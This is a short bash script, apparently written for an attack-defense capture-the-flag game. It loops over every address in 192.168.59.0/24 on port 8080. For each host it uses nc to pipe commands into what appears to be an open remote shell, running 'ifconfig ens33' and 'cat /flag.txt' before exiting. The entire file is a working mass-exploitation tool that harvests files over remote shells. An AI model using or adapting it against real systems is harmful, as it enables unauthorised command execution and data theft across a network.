#!/bin/bash
port="8080"
for i in `seq 1 255`
do
{
    host="192.168.59.$i"
    {
        sleep 1
	echo "ifconfig ens33"
	sleep 1
        echo "cat /flag.txt"
        sleep 1
	echo "exit"
    } | nc "$host" "$port"
}
done
